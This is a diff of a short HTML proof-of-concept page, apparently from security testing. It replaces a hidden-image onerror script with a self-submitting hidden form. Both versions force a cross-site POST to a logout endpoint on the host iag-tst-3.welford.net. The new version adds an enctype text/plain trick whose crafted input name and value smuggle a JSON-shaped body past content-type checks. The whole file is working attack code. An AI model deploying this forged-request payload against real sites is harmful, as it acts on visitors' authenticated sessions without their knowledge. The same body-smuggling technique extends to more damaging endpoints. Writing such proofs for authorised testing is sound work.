@@ -1,25 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
-<img src="x" style="display:none" onerror="logout()">
+<form id="f" action="https://iag-tst-3.welford.net/api/auth/logout" method="POST" enctype="text/plain">
+<input name='{"_":"' value='"}' type="hidden">
+</form>
 <script>
-function logout() {
-  var f = document.createElement('iframe');
-  f.style.display = 'none';
-  f.name = 'csrf';
-  document.body.appendChild(f);
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'https://iag-tst-3.welford.net/api/auth/logout';
-  form.target = 'csrf';
-  form.enctype = 'application/json';
-  var input = document.createElement('input');
-  input.type = 'hidden';
-  input.name = '{}';
-  form.appendChild(input);
-  document.body.appendChild(form);
-  form.submit();
-}
+document.getElementById('f').submit();
 </script>
 </body>
 </html>
